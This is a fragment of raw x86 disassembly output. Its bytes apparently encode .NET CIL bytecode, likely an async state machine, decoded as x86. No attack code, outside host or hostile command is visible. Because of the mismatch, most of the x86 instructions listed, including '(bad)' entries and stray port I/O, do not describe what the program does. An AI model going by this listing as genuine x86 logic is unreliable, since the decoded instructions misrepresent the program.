  403614:	c1 00 00             	roll   $0x0,(%eax)
  403617:	0a 0b                	or     (%ebx),%cl
  403619:	12 01                	adc    (%ecx),%al
  40361b:	28 c2                	sub    %al,%dl
  40361d:	00 00                	add    %al,(%eax)
  40361f:	0a 2d 43 02 16 25    	or     0x25160243,%ch
  403625:	0a 7d 38             	or     0x38(%ebp),%bh
  403628:	00 00                	add    %al,(%eax)
  40362a:	04 02                	add    $0x2,%al
  40362c:	07                   	pop    %es
  40362d:	7d 3f                	jge    0x40366e
  40362f:	00 00                	add    %al,(%eax)
  403631:	04 02                	add    $0x2,%al
  403633:	0d 02 7c 39 00       	or     $0x397c02,%eax
  403638:	00 04 12             	add    %al,(%edx,%edx,1)
  40363b:	01 12                	add    %edx,(%edx)
  40363d:	03 28                	add    (%eax),%ebp
  40363f:	0d 00 00 2b 00       	or     $0x2b0000,%eax
  403644:	dd 22                	frstor (%edx)
  403646:	01 00                	add    %eax,(%eax)
  403648:	00 02                	add    %al,(%edx)
  40364a:	7b 3f                	jnp    0x40368b
  40364c:	00 00                	add    %al,(%eax)
  40364e:	04 0b                	add    $0xb,%al
  403650:	02 7c 3f 00          	add    0x0(%edi,%edi,1),%bh
  403654:	00 04 fe             	add    %al,(%esi,%edi,8)
  403657:	15 1c 00 00 01       	adc    $0x100001c,%eax
  40365c:	02 15 25 0a 7d 38    	add    0x387d0a25,%dl
  403662:	00 00                	add    %al,(%eax)
  403664:	04 12                	add    $0x12,%al
  403666:	01 28                	add    %ebp,(%eax)
  403668:	c3                   	ret
  403669:	00 00                	add    %al,(%eax)
  40366b:	0a 00                	or     (%eax),%al
  40366d:	02 02                	add    (%edx),%al
  40366f:	7b 3b                	jnp    0x4036ac
  403671:	00 00                	add    %al,(%eax)
  403673:	04 6f                	add    $0x6f,%al
  403675:	d1 00                	roll   $1,(%eax)
  403677:	00 0a                	add    %cl,(%edx)
  403679:	6f                   	outsl  %ds:(%esi),(%dx)
  40367a:	d2 00                	rolb   %cl,(%eax)
  40367c:	00 0a                	add    %cl,(%edx)
  40367e:	7d 3e                	jge    0x4036be
  403680:	00 00                	add    %al,(%eax)
  403682:	04 02                	add    $0x2,%al
  403684:	7b 3e                	jnp    0x4036c4
  403686:	00 00                	add    %al,(%eax)
  403688:	04 7e                	add    $0x7e,%al
  40368a:	5a                   	pop    %edx
  40368b:	00 00                	add    %al,(%eax)
  40368d:	0a 6f d3             	or     -0x2d(%edi),%ch
  403690:	00 00                	add    %al,(%eax)
  403692:	0a 2d 15 02 7b 3e    	or     0x3e7b0215,%ch
  403698:	00 00                	add    %al,(%eax)
  40369a:	04 7e                	add    $0x7e,%al
  40369c:	d4 00                	aam    $0x0
  40369e:	00 0a                	add    %cl,(%edx)
  4036a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a1:	d3 00                	roll   %cl,(%eax)
  4036a3:	00 0a                	add    %cl,(%edx)
  4036a5:	16                   	push   %ss
  4036a6:	fe 01                	incb   (%ecx)
  4036a8:	2b 01                	sub    (%ecx),%eax
  4036aa:	16                   	push   %ss
  4036ab:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4036ae:	04 2c                	add    $0x2c,%al
  4036b0:	1f                   	pop    %ds
  4036b1:	00 02                	add    %al,(%edx)
  4036b3:	7b 3b                	jnp    0x4036f0
  4036b5:	00 00                	add    %al,(%eax)
  4036b7:	04 6f                	add    $0x6f,%al
  4036b9:	cd 00                	int    $0x0
  4036bb:	00 0a                	add    %cl,(%edx)
  4036bd:	02 7b 3e             	add    0x3e(%ebx),%bh
  4036c0:	00 00                	add    %al,(%eax)
  4036c2:	04 16                	add    $0x16,%al
  4036c4:	73 d5                	jae    0x40369b
  4036c6:	00 00                	add    %al,(%eax)
  4036c8:	0a 6f d6             	or     -0x2a(%edi),%ch
  4036cb:	00 00                	add    %al,(%eax)
  4036cd:	0a 00                	or     (%eax),%al
  4036cf:	00 02                	add    %al,(%edx)
  4036d1:	7b 3d                	jnp    0x403710
  4036d3:	00 00                	add    %al,(%eax)
  4036d5:	04 02                	add    $0x2,%al
  4036d7:	7b 3c                	jnp    0x403715
  4036d9:	00 00                	add    %al,(%eax)
  4036db:	04 7b                	add    $0x7b,%al
  4036dd:	1f                   	pop    %ds
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	04 6f                	add    $0x6f,%al
  4036e2:	d7                   	xlat   %ds:(%ebx)
  4036e3:	00 00                	add    %al,(%eax)
  4036e5:	0a 2c 10             	or     (%eax,%edx,1),%ch
  4036e8:	02 7b 3c             	add    0x3c(%ebx),%bh
  4036eb:	00 00                	add    %al,(%eax)
  4036ed:	04 7b                	add    $0x7b,%al
  4036ef:	22 00                	and    (%eax),%al
  4036f1:	00 04 14             	add    %al,(%esp,%edx,1)
  4036f4:	fe 01                	incb   (%ecx)
  4036f6:	2b 01                	sub    (%ecx),%eax
  4036f8:	17                   	pop    %ss
  4036f9:	13 05 11 05 2c 11    	adc    0x112c0511,%eax
  4036ff:	00 02                	add    %al,(%edx)
  403701:	7b 3b                	jnp    0x40373e
  403703:	00 00                	add    %al,(%eax)
  403705:	04 16                	add    $0x16,%al
  403707:	6f                   	outsl  %ds:(%esi),(%dx)
  403708:	d8 00                	fadds  (%eax)
  40370a:	00 0a                	add    %cl,(%edx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	2b 0f                	sub    (%edi),%ecx
  403710:	00 02                	add    %al,(%edx)
  403712:	7b 3b                	jnp    0x40374f
  403714:	00 00                	add    %al,(%eax)
  403716:	04 17                	add    $0x17,%al
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	d8 00                	fadds  (%eax)
  40371b:	00 0a                	add    %cl,(%edx)
  40371d:	00 00                	add    %al,(%eax)
  40371f:	de 28                	fisubrs (%eax)
  403721:	13 06                	adc    (%esi),%eax
  403723:	02 1f                	add    (%edi),%bl
  403725:	fe                   	(bad)
  403726:	7d 38                	jge    0x403760
  403728:	00 00                	add    %al,(%eax)
  40372a:	04 02                	add    $0x2,%al
  40372c:	14 7d                	adc    $0x7d,%al
  40372e:	3d 00 00 04 02       	cmp    $0x2040000,%eax
  403733:	14 7d                	adc    $0x7d,%al
  403735:	3e 00 00             	add    %al,%ds:(%eax)
  403738:	04 02                	add    $0x2,%al
  40373a:	7c 39                	jl     0x403775
  40373c:	00 00                	add    %al,(%eax)
  40373e:	04 11                	add    $0x11,%al
  403740:	06                   	push   %es
  403741:	28 d9                	sub    %bl,%cl
  403743:	00 00                	add    %al,(%eax)
  403745:	0a 00                	or     (%eax),%al
  403747:	de 22                	fisubs (%edx)
  403749:	02 1f                	add    (%edi),%bl
  40374b:	fe                   	(bad)
  40374c:	7d 38                	jge    0x403786
  40374e:	00 00                	add    %al,(%eax)
  403750:	04 02                	add    $0x2,%al
  403752:	14 7d                	adc    $0x7d,%al
  403754:	3d 00 00 04 02       	cmp    $0x2040000,%eax
  403759:	14 7d                	adc    $0x7d,%al
  40375b:	3e 00 00             	add    %al,%ds:(%eax)
  40375e:	04 02                	add    $0x2,%al
  403760:	7c 39                	jl     0x40379b
  403762:	00 00                	add    %al,(%eax)
  403764:	04 28                	add    $0x28,%al
  403766:	da 00                	fiaddl (%eax)
  403768:	00 0a                	add    %cl,(%edx)
  40376a:	00 2a                	add    %ch,(%edx)
  40376c:	41                   	inc    %ecx
  40376d:	1c 00                	sbb    $0x0,%al
  40376f:	00 00                	add    %al,(%eax)
  403771:	00 00                	add    %al,(%eax)
  403773:	00 07                	add    %al,(%edi)
  403775:	00 00                	add    %al,(%eax)
  403777:	00 5a 01             	add    %bl,0x1(%edx)
  40377a:	00 00                	add    %al,(%eax)
  40377c:	61                   	popa
  40377d:	01 00                	add    %eax,(%eax)
  40377f:	00 28                	add    %ch,(%eax)
  403781:	00 00                	add    %al,(%eax)
  403783:	00 1d 00 00 01 06    	add    %bl,0x6010000
  403789:	2a 22                	sub    (%edx),%ah
  40378b:	02 28                	add    (%eax),%ch
  40378d:	22 00                	and    (%eax),%al
  40378f:	00 0a                	add    %cl,(%edx)
  403791:	00 2a                	add    %ch,(%edx)
  403793:	00 1b                	add    %bl,(%ebx)
  403795:	30 04 00             	xor    %al,(%eax,%eax,1)
  403798:	47                   	inc    %edi
  403799:	08 00                	or     %al,(%eax)
  40379b:	00 15 00 00 11 02    	add    %dl,0x2110000
  4037a1:	7b 40                	jnp    0x4037e3
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	04 0a                	add    $0xa,%al
  4037a7:	06                   	push   %es
  4037a8:	45                   	inc    %ebp
  4037a9:	0c 00                	or     $0x0,%al
  4037ab:	00 00                	add    %al,(%eax)
  4037ad:	02 00                	add    (%eax),%al
  4037af:	00 00                	add    %al,(%eax)
  4037b1:	07                   	pop    %es
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4037b7:	00 00                	add    %al,(%eax)
  4037b9:	11 00                	adc    %eax,(%eax)
  4037bb:	00 00                	add    %al,(%eax)
  4037bd:	16                   	push   %ss
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	00 1b                	add    %bl,(%ebx)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	00 20                	add    %ah,(%eax)
  4037c6:	00 00                	add    %al,(%eax)
  4037c8:	00 25 00 00 00 2a    	add    %ah,0x2a000000
  4037ce:	00 00                	add    %al,(%eax)
  4037d0:	00 2f                	add    %ch,(%edi)
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	00 34 00             	add    %dh,(%eax,%eax,1)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	39 00                	cmp    %eax,(%eax)
  4037db:	00 00                	add    %al,(%eax)
  4037dd:	2b 3c 38             	sub    (%eax,%edi,1),%edi
  4037e0:	27                   	daa
  4037e1:	01 00                	add    %eax,(%eax)
  4037e3:	00 38                	add    %bh,(%eax)
  4037e5:	c8 01 00 00          	enter  $0x1,$0x0
  4037e9:	38 75 02             	cmp    %dh,0x2(%ebp)
  4037ec:	00 00                	add    %al,(%eax)
  4037ee:	38 32                	cmp    %dh,(%edx)
  4037f0:	03 00                	add    (%eax),%eax
  4037f2:	00 38                	add    %bh,(%eax)
  4037f4:	d1 03                	roll   $1,(%ebx)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	38 51 04             	cmp    %dl,0x4(%ecx)
  4037fb:	00 00                	add    %al,(%eax)
  4037fd:	38 c4                	cmp    %al,%ah
  4037ff:	04 00                	add    $0x0,%al
  403801:	00 38                	add    %bh,(%eax)
  403803:	37                   	aaa
  403804:	05 00 00 38 aa       	add    $0xaa380000,%eax
  403809:	05 00 00 38 1f       	add    $0x1f380000,%eax
  40380e:	06                   	push   %es
  40380f:	00 00                	add    %al,(%eax)
  403811:	38 e7                	cmp    %ah,%bh
  403813:	06                   	push   %es
  403814:	00 00                	add    %al,(%eax)
  403816:	38 58 07             	cmp    %bl,0x7(%eax)
  403819:	00 00                	add    %al,(%eax)
  40381b:	00 02                	add    %al,(%edx)
  40381d:	02 7b 43             	add    0x43(%ebx),%bh
  403820:	00 00                	add    %al,(%eax)
  403822:	04 6f                	add    $0x6f,%al
  403824:	d1 00                	roll   $1,(%eax)
  403826:	00 0a                	add    %cl,(%edx)
  403828:	6f                   	outsl  %ds:(%esi),(%dx)
  403829:	d2 00                	rolb   %cl,(%eax)
  40382b:	00 0a                	add    %cl,(%edx)
  40382d:	7d 45                	jge    0x403874
  40382f:	00 00                	add    %al,(%eax)
  403831:	04 02                	add    $0x2,%al
  403833:	7b 45                	jnp    0x40387a
  403835:	00 00                	add    %al,(%eax)
  403837:	04 7e                	add    $0x7e,%al
  403839:	5a                   	pop    %edx
  40383a:	00 00                	add    %al,(%eax)
  40383c:	0a 6f d3             	or     -0x2d(%edi),%ch
  40383f:	00 00                	add    %al,(%eax)
  403841:	0a 2d 15 02 7b 45    	or     0x457b0215,%ch
  403847:	00 00                	add    %al,(%eax)
  403849:	04 7e                	add    $0x7e,%al
  40384b:	d4 00                	aam    $0x0
  40384d:	00 0a                	add    %cl,(%edx)
  40384f:	6f                   	outsl  %ds:(%esi),(%dx)
  403850:	d3 00                	roll   %cl,(%eax)
  403852:	00 0a                	add    %cl,(%edx)
  403854:	16                   	push   %ss
  403855:	fe 01                	incb   (%ecx)
  403857:	2b 01                	sub    (%ecx),%eax
  403859:	16                   	push   %ss
  40385a:	0b 07                	or     (%edi),%eax
  40385c:	2c 1f                	sub    $0x1f,%al
  40385e:	00 02                	add    %al,(%edx)
  403860:	7b 43                	jnp    0x4038a5
  403862:	00 00                	add    %al,(%eax)
  403864:	04 6f                	add    $0x6f,%al
  403866:	cd 00                	int    $0x0
  403868:	00 0a                	add    %cl,(%edx)
  40386a:	02 7b 45             	add    0x45(%ebx),%bh
  40386d:	00 00                	add    %al,(%eax)
  40386f:	04 16                	add    $0x16,%al
  403871:	73 d5                	jae    0x403848
  403873:	00 00                	add    %al,(%eax)
  403875:	0a 6f d6             	or     -0x2a(%edi),%ch
  403878:	00 00                	add    %al,(%eax)
  40387a:	0a 00                	or     (%eax),%al
  40387c:	00 02                	add    %al,(%edx)
  40387e:	02 7b 43             	add    0x43(%ebx),%bh
  403881:	00 00                	add    %al,(%eax)
  403883:	04 6f                	add    $0x6f,%al
  403885:	cd 00                	int    $0x0
  403887:	00 0a                	add    %cl,(%edx)
  403889:	6f                   	outsl  %ds:(%esi),(%dx)
  40388a:	ce                   	into
  40388b:	00 00                	add    %al,(%eax)
  40388d:	0a 6f cf             	or     -0x31(%edi),%ch
  403890:	00 00                	add    %al,(%eax)
  403892:	0a 6f 16             	or     0x16(%edi),%ch
  403895:	00 00                	add    %al,(%eax)
  403897:	0a 7d 46             	or     0x46(%ebp),%bh
  40389a:	00 00                	add    %al,(%eax)
  40389c:	04 02                	add    $0x2,%al
  40389e:	7b 44                	jnp    0x4038e4
  4038a0:	00 00                	add    %al,(%eax)
  4038a2:	04 72                	add    $0x72,%al
  4038a4:	e9 3d 00 70 02       	jmp    0x2b038e6
  4038a9:	7b 42                	jnp    0x4038ed
  4038ab:	00 00                	add    %al,(%eax)
  4038ad:	04 74                	add    $0x74,%al
  4038af:	24 00                	and    $0x0,%al
  4038b1:	00 01                	add    %al,(%ecx)
  4038b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b4:	db 00                	fildl  (%eax)
  4038b6:	00 0a                	add    %cl,(%edx)
  4038b8:	0d 12 03 28 dc       	or     $0xdc280312,%eax
  4038bd:	00 00                	add    %al,(%eax)
  4038bf:	0a 28                	or     (%eax),%ch
  4038c1:	71 00                	jno    0x4038c3
  4038c3:	00 0a                	add    %cl,(%edx)
  4038c5:	12 04 fe             	adc    (%esi,%edi,8),%al
  4038c8:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  4038cd:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4038d0:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  4038d5:	c1 00 00             	roll   $0x0,(%eax)
  4038d8:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4038db:	02 28                	add    (%eax),%ch
  4038dd:	c2 00 00             	ret    $0x0
  4038e0:	0a 2d 44 02 16 25    	or     0x25160244,%ch
  4038e6:	0a 7d 40             	or     0x40(%ebp),%bh
  4038e9:	00 00                	add    %al,(%eax)
  4038eb:	04 02                	add    $0x2,%al
  4038ed:	08 7d 49             	or     %bh,0x49(%ebp)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	04 02                	add    $0x2,%al
  4038f4:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  4038fa:	00 04 12             	add    %al,(%edx,%edx,1)
  4038fd:	02 12                	add    (%edx),%dl
  4038ff:	05 28 0e 00 00       	add    $0xe28,%eax
  403904:	2b 00                	sub    (%eax),%eax
  403906:	dd db                	fstp   %st(3)
  403908:	06                   	push   %es
  403909:	00 00                	add    %al,(%eax)
  40390b:	02 7b 49             	add    0x49(%ebx),%bh
  40390e:	00 00                	add    %al,(%eax)
  403910:	04 0c                	add    $0xc,%al
  403912:	02 7c 49 00          	add    0x0(%ecx,%ecx,2),%bh
  403916:	00 04 fe             	add    %al,(%esi,%edi,8)
  403919:	15 1c 00 00 01       	adc    $0x100001c,%eax
  40391e:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403924:	00 00                	add    %al,(%eax)
  403926:	04 12                	add    $0x12,%al
  403928:	02 28                	add    (%eax),%ch
  40392a:	c3                   	ret
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 00                	or     (%eax),%al
  40392f:	02 7b 44             	add    0x44(%ebx),%bh
  403932:	00 00                	add    %al,(%eax)
  403934:	04 72                	add    $0x72,%al
  403936:	1f                   	pop    %ds
  403937:	3e 00 70 02          	add    %dh,%ds:0x2(%eax)
  40393b:	7b 43                	jnp    0x403980
  40393d:	00 00                	add    %al,(%eax)
  40393f:	04 6f                	add    $0x6f,%al
  403941:	cd 00                	int    $0x0
  403943:	00 0a                	add    %cl,(%edx)
  403945:	6f                   	outsl  %ds:(%esi),(%dx)
  403946:	ce                   	into
  403947:	00 00                	add    %al,(%eax)
  403949:	0a 6f dd             	or     -0x23(%edi),%ch
  40394c:	00 00                	add    %al,(%eax)
  40394e:	0a 02                	or     (%edx),%al
  403950:	7b 43                	jnp    0x403995
  403952:	00 00                	add    %al,(%eax)
  403954:	04 6f                	add    $0x6f,%al
  403956:	cd 00                	int    $0x0
  403958:	00 0a                	add    %cl,(%edx)
  40395a:	6f                   	outsl  %ds:(%esi),(%dx)
  40395b:	ce                   	into
  40395c:	00 00                	add    %al,(%eax)
  40395e:	0a 6f de             	or     -0x22(%edi),%ch
  403961:	00 00                	add    %al,(%eax)
  403963:	0a 28                	or     (%eax),%ch
  403965:	31 00                	xor    %eax,(%eax)
  403967:	00 0a                	add    %cl,(%edx)
  403969:	12 04 fe             	adc    (%esi,%edi,8),%al
  40396c:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403971:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403974:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
  403979:	c1 00 00             	roll   $0x0,(%eax)
  40397c:	0a 13                	or     (%ebx),%dl
  40397e:	06                   	push   %es
  40397f:	12 06                	adc    (%esi),%al
  403981:	28 c2                	sub    %al,%dl
  403983:	00 00                	add    %al,(%eax)
  403985:	0a 2d 46 02 17 25    	or     0x25170246,%ch
  40398b:	0a 7d 40             	or     0x40(%ebp),%bh
  40398e:	00 00                	add    %al,(%eax)
  403990:	04 02                	add    $0x2,%al
  403992:	11 06                	adc    %eax,(%esi)
  403994:	7d 49                	jge    0x4039df
  403996:	00 00                	add    %al,(%eax)
  403998:	04 02                	add    $0x2,%al
  40399a:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  4039a0:	00 04 12             	add    %al,(%edx,%edx,1)
  4039a3:	06                   	push   %es
  4039a4:	12 05 28 0e 00 00    	adc    0xe28,%al
  4039aa:	2b 00                	sub    (%eax),%eax
  4039ac:	dd 35 06 00 00 02    	fnsave 0x2000006
  4039b2:	7b 49                	jnp    0x4039fd
  4039b4:	00 00                	add    %al,(%eax)
  4039b6:	04 13                	add    $0x13,%al
  4039b8:	06                   	push   %es
  4039b9:	02 7c 49 00          	add    0x0(%ecx,%ecx,2),%bh
  4039bd:	00 04 fe             	add    %al,(%esi,%edi,8)
  4039c0:	15 1c 00 00 01       	adc    $0x100001c,%eax
  4039c5:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  4039cb:	00 00                	add    %al,(%eax)
  4039cd:	04 12                	add    $0x12,%al
  4039cf:	06                   	push   %es
  4039d0:	28 c3                	sub    %al,%bl
  4039d2:	00 00                	add    %al,(%eax)
  4039d4:	0a 00                	or     (%eax),%al
  4039d6:	02 7b 46             	add    0x46(%ebx),%bh
  4039d9:	00 00                	add    %al,(%eax)
  4039db:	04 02                	add    $0x2,%al
  4039dd:	7b 44                	jnp    0x403a23
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	04 7b                	add    $0x7b,%al
  4039e3:	1f                   	pop    %ds
  4039e4:	00 00                	add    %al,(%eax)
  4039e6:	04 6f                	add    $0x6f,%al
  4039e8:	d7                   	xlat   %ds:(%ebx)
  4039e9:	00 00                	add    %al,(%eax)
  4039eb:	0a 13                	or     (%ebx),%dl
  4039ed:	07                   	pop    %es
  4039ee:	11 07                	adc    %eax,(%edi)
  4039f0:	39 a5 05 00 00 00    	cmp    %esp,0x5(%ebp)
  4039f6:	02 7b 43             	add    0x43(%ebx),%bh
  4039f9:	00 00                	add    %al,(%eax)
  4039fb:	04 6f                	add    $0x6f,%al
  4039fd:	cd 00                	int    $0x0
  4039ff:	00 0a                	add    %cl,(%edx)
  403a01:	6f                   	outsl  %ds:(%esi),(%dx)
  403a02:	ce                   	into
  403a03:	00 00                	add    %al,(%eax)
  403a05:	0a 6f df             	or     -0x21(%edi),%ch
  403a08:	00 00                	add    %al,(%eax)
  403a0a:	0a 13                	or     (%ebx),%dl
  403a0c:	08 11                	or     %dl,(%ecx)
  403a0e:	08 39                	or     %bh,(%ecx)
  403a10:	4e                   	dec    %esi
  403a11:	04 00                	add    $0x0,%al
  403a13:	00 00                	add    %al,(%eax)
  403a15:	02 7b 43             	add    0x43(%ebx),%bh
  403a18:	00 00                	add    %al,(%eax)
  403a1a:	04 12                	add    $0x12,%al
  403a1c:	0a fe                	or     %dh,%bh
  403a1e:	15 37 00 00 01       	adc    $0x1000037,%eax
  403a23:	11 0a                	adc    %ecx,(%edx)
  403a25:	6f                   	outsl  %ds:(%esi),(%dx)
  403a26:	e0 00                	loopne 0x403a28
  403a28:	00 0a                	add    %cl,(%edx)
  403a2a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a2b:	e1 00                	loope  0x403a2d
  403a2d:	00 0a                	add    %cl,(%edx)
  403a2f:	13 09                	adc    (%ecx),%ecx
  403a31:	12 09                	adc    (%ecx),%cl
  403a33:	28 e2                	sub    %ah,%dl
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 2d 46 02 18 25    	or     0x25180246,%ch
  403a3d:	0a 7d 40             	or     0x40(%ebp),%bh
  403a40:	00 00                	add    %al,(%eax)
  403a42:	04 02                	add    $0x2,%al
  403a44:	11 09                	adc    %ecx,(%ecx)
  403a46:	7d 4a                	jge    0x403a92
  403a48:	00 00                	add    %al,(%eax)
  403a4a:	04 02                	add    $0x2,%al
  403a4c:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403a52:	00 04 12             	add    %al,(%edx,%edx,1)
  403a55:	09 12                	or     %edx,(%edx)
  403a57:	05 28 0f 00 00       	add    $0xf28,%eax
  403a5c:	2b 00                	sub    (%eax),%eax
  403a5e:	dd 83 05 00 00 02    	fldl   0x2000005(%ebx)
  403a64:	7b 4a                	jnp    0x403ab0
  403a66:	00 00                	add    %al,(%eax)
  403a68:	04 13                	add    $0x13,%al
  403a6a:	09 02                	or     %eax,(%edx)
  403a6c:	7c 4a                	jl     0x403ab8
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	04 fe                	add    $0xfe,%al
  403a72:	15 0b 00 00 1b       	adc    $0x1b00000b,%eax
  403a77:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403a7d:	00 00                	add    %al,(%eax)
  403a7f:	04 02                	add    $0x2,%al
  403a81:	12 09                	adc    (%ecx),%cl
  403a83:	28 e3                	sub    %ah,%bl
  403a85:	00 00                	add    %al,(%eax)
  403a87:	0a 7d 48             	or     0x48(%ebp),%bh
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	04 02                	add    $0x2,%al
  403a8e:	02 7b 48             	add    0x48(%ebx),%bh
  403a91:	00 00                	add    %al,(%eax)
  403a93:	04 7d                	add    $0x7d,%al
  403a95:	47                   	inc    %edi
  403a96:	00 00                	add    %al,(%eax)
  403a98:	04 02                	add    $0x2,%al
  403a9a:	14 7d                	adc    $0x7d,%al
  403a9c:	48                   	dec    %eax
  403a9d:	00 00                	add    %al,(%eax)
  403a9f:	04 02                	add    $0x2,%al
  403aa1:	7b 47                	jnp    0x403aea
  403aa3:	00 00                	add    %al,(%eax)
  403aa5:	04 72                	add    $0x72,%al
  403aa7:	2f                   	das
  403aa8:	3e 00 70 6f          	add    %dh,%ds:0x6f(%eax)
  403aac:	d7                   	xlat   %ds:(%ebx)
  403aad:	00 00                	add    %al,(%eax)
  403aaf:	0a 2c 15 02 7b 47 00 	or     0x477b02(,%edx,1),%ch
  403ab6:	00 04 72             	add    %al,(%edx,%esi,2)
  403ab9:	67 3e 00 70 6f       	add    %dh,%ds:0x6f(%bx,%si)
  403abe:	d7                   	xlat   %ds:(%ebx)
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	0a 16                	or     (%esi),%dl
  403ac3:	fe 01                	incb   (%ecx)
  403ac5:	2b 01                	sub    (%ecx),%eax
  403ac7:	16                   	push   %ss
  403ac8:	13 0b                	adc    (%ebx),%ecx
  403aca:	11 0b                	adc    %ecx,(%ebx)
  403acc:	39 8b 00 00 00 00    	cmp    %ecx,0x0(%ebx)
  403ad2:	02 7b 44             	add    0x44(%ebx),%bh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	04 72                	add    $0x72,%al
  403ad9:	83 3e 00             	cmpl   $0x0,(%esi)
  403adc:	70 12                	jo     0x403af0
  403ade:	04 fe                	add    $0xfe,%al
  403ae0:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403ae5:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403ae8:	1e                   	push   %ds
  403ae9:	00 00                	add    %al,(%eax)
  403aeb:	06                   	push   %es
  403aec:	6f                   	outsl  %ds:(%esi),(%dx)
  403aed:	c1 00 00             	roll   $0x0,(%eax)
  403af0:	0a 13                	or     (%ebx),%dl
  403af2:	0c 12                	or     $0x12,%al
  403af4:	0c 28                	or     $0x28,%al
  403af6:	c2 00 00             	ret    $0x0
  403af9:	0a 2d 46 02 19 25    	or     0x25190246,%ch
  403aff:	0a 7d 40             	or     0x40(%ebp),%bh
  403b02:	00 00                	add    %al,(%eax)
  403b04:	04 02                	add    $0x2,%al
  403b06:	11 0c 7d 49 00 00 04 	adc    %ecx,0x4000049(,%edi,2)
  403b0d:	02 13                	add    (%ebx),%dl
  403b0f:	05 02 7c 41 00       	add    $0x417c02,%eax
  403b14:	00 04 12             	add    %al,(%edx,%edx,1)
  403b17:	0c 12                	or     $0x12,%al
  403b19:	05 28 0e 00 00       	add    $0xe28,%eax
  403b1e:	2b 00                	sub    (%eax),%eax
  403b20:	dd c1                	ffree  %st(1)
  403b22:	04 00                	add    $0x0,%al
  403b24:	00 02                	add    %al,(%edx)
  403b26:	7b 49                	jnp    0x403b71
  403b28:	00 00                	add    %al,(%eax)
  403b2a:	04 13                	add    $0x13,%al
  403b2c:	0c 02                	or     $0x2,%al
  403b2e:	7c 49                	jl     0x403b79
  403b30:	00 00                	add    %al,(%eax)
  403b32:	04 fe                	add    $0xfe,%al
  403b34:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403b39:	02 15 25 0a 7d 40    	add    0x407d0a25,%dl
  403b3f:	00 00                	add    %al,(%eax)
  403b41:	04 12                	add    $0x12,%al
  403b43:	0c 28                	or     $0x28,%al
  403b45:	c3                   	ret
  403b46:	00 00                	add    %al,(%eax)
  403b48:	0a 00                	or     (%eax),%al
  403b4a:	02 7b 44             	add    0x44(%ebx),%bh
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	04 17                	add    $0x17,%al
  403b51:	7d 13                	jge    0x403b66
  403b53:	00 00                	add    %al,(%eax)
  403b55:	04 00                	add    $0x0,%al
  403b57:	38 9f 00 00 00 02    	cmp    %bl,0x2000000(%edi)
  403b5d:	7b 47                	jnp    0x403ba6
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	04 72                	add    $0x72,%al
  403b63:	c7                   	(bad)
  403b64:	3e 00 70 6f          	add    %dh,%ds:0x6f(%eax)
  403b68:	d7                   	xlat   %ds:(%ebx)
  403b69:	00 00                	add    %al,(%eax)
  403b6b:	0a 13                	or     (%ebx),%dl
  403b6d:	0d 11 0d 39 86       	or     $0x86390d11,%eax
  403b72:	00 00                	add    %al,(%eax)
  403b74:	00 00                	add    %al,(%eax)
  403b76:	02 7b 44             	add    0x44(%ebx),%bh
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	04 72                	add    $0x72,%al
  403b7d:	e3 3e                	jecxz  0x403bbd
  403b7f:	00 70 12             	add    %dh,0x12(%eax)
  403b82:	04 fe                	add    $0xfe,%al
  403b84:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  403b89:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403b8c:	1e                   	push   %ds
  403b8d:	00 00                	add    %al,(%eax)
  403b8f:	06                   	push   %es
  403b90:	6f                   	outsl  %ds:(%esi),(%dx)
  403b91:	c1 00 00             	roll   $0x0,(%eax)
  403b94:	0a 13                	or     (%ebx),%dl
  403b96:	0e                   	push   %cs
  403b97:	12 0e                	adc    (%esi),%cl
  403b99:	28 c2                	sub    %al,%dl
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 2d 46 02 1a 25    	or     0x251a0246,%ch
  403ba3:	0a 7d 40             	or     0x40(%ebp),%bh
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	04 02                	add    $0x2,%al
  403baa:	11 0e                	adc    %ecx,(%esi)
  403bac:	7d 49                	jge    0x403bf7
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	04 02                	add    $0x2,%al
  403bb2:	13 05 02 7c 41 00    	adc    0x417c02,%eax
  403bb8:	00 04 12             	add    %al,(%edx,%edx,1)
  403bbb:	0e                   	push   %cs
